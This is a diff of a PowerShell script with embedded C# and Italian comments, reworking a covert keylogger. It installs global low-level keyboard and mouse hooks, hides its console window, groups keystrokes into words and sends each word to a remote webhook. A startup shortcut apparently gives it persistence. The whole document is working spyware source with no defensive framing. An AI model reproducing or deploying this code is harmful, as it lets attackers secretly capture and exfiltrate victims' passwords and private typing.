@@ -19,35 +19,28 @@ Create-StartupShortcut
 # --- Nascondi la console ---
 Add-Type -TypeDefinition @"
 using System;
-using System.Runtime.InteropServices;
-public class Win {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    public const int SW_HIDE = 0;
-}
-"@
-[Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
-
-# --- Global keyboard hook con caratteri unicode ---
-Add-Type -TypeDefinition @"
-using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 
-public class GlobalKeyboardListener {
+public class GlobalListener {
     private const int WH_KEYBOARD_LL = 13;
+    private const int WH_MOUSE_LL    = 14;
     private const int WM_KEYDOWN     = 0x0100;
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
+    private const int WM_LBUTTONDOWN = 0x0201;
+
+    private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static LowLevelProc _keyboardProc = KeyboardCallback;
+    private static LowLevelProc _mouseProc    = MouseCallback;
+    private static IntPtr _kbdHookID = IntPtr.Zero;
+    private static IntPtr _mouseHookID = IntPtr.Zero;
+
+    private static StringBuilder _buffer = new StringBuilder(100);
     public static Action<string> Callback;
 
     [DllImport("user32.dll", SetLastError=true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
     [DllImport("user32.dll", SetLastError=true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
@@ -66,48 +59,75 @@ public class GlobalKeyboardListener {
     public static void Start() {
         using (Process cur = Process.GetCurrentProcess())
         using (ProcessModule mod = cur.MainModule) {
-            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
-                GetModuleHandle(mod.ModuleName), 0);
+            IntPtr hModule = GetModuleHandle(mod.ModuleName);
+            _kbdHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, hModule, 0);
+            _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, hModule, 0);
         }
     }
 
     public static void Stop() {
-        UnhookWindowsHookEx(_hookID);
+        UnhookWindowsHookEx(_kbdHookID);
+        UnhookWindowsHookEx(_mouseHookID);
     }
 
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+    private static IntPtr KeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            string key = null;
+            int vk = Marshal.ReadInt32(lParam);
             byte[] state = new byte[256];
-            if (GetKeyboardState(state)) {
-                uint scanCode = MapVirtualKey((uint)vkCode, 0);
-                var sb = new StringBuilder(2);
-                int ret = ToUnicode((uint)vkCode, scanCode, state, sb, sb.Capacity, 0);
-                if (ret > 0) {
-                    key = sb.ToString();
-                }
+            GetKeyboardState(state);
+            uint scan = MapVirtualKey((uint)vk, 0);
+            var sb = new StringBuilder(2);
+            int r = ToUnicode((uint)vk, scan, state, sb, sb.Capacity, 0);
+            char c = r > 0 ? sb[0] : '\0';
+
+            if (c != '\0') _buffer.Append(c);
+            else if (vk == (int)Keys.Space || vk == (int)Keys.Enter) {
+                _buffer.Append(vk == (int)Keys.Space ? ' ' : '\n');
+                FlushBuffer();
             }
-            if (key == null) {
-                key = ((Keys)vkCode).ToString();
+            if (vk == (int)Keys.Escape) {
+                Stop();
+                Application.Exit();
             }
-            if (Callback != null) { Callback(key); }
-            if ((Keys)vkCode == Keys.Escape) { Stop(); Application.Exit(); }
         }
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        return CallNextHookEx(_kbdHookID, nCode, wParam, lParam);
+    }
+
+    private static IntPtr MouseCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_LBUTTONDOWN) {
+            FlushBuffer();
+        }
+        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
+    }
+
+    private static void FlushBuffer() {
+        if (_buffer.Length > 0 && Callback != null) {
+            Callback(_buffer.ToString());
+            _buffer.Clear();
+        }
     }
 }
-"@ -ReferencedAssemblies "System.Windows.Forms","System.Text"
+"@ -ReferencedAssemblies "System.Windows.Forms","System.Text","System.Core"
 
-# --- Assegna callback al listener ---
-$cb = [System.Action[string]]{
-    param($k)
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $k } | ConvertTo-Json) -ContentType "application/json"
-    } catch { }
+# Nascondi la console
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    public const int SW_HIDE = 0;
 }
-[GlobalKeyboardListener]::Callback = $cb
+"@
+[Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
 
-# --- Avvio del hook invisibile ---
-[GlobalKeyboardListener]::Start()
+# Callback PowerShell: invia parola al webhook
+[GlobalListener]::Callback = [Action[string]]{ param($msg)
+    try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $msg } | ConvertTo-Json) -ContentType 'application/json' } catch {}
+}
+
+# Avvio dei hook invisibili
+[GlobalListener]::Start()
 [System.Windows.Forms.Application]::Run()
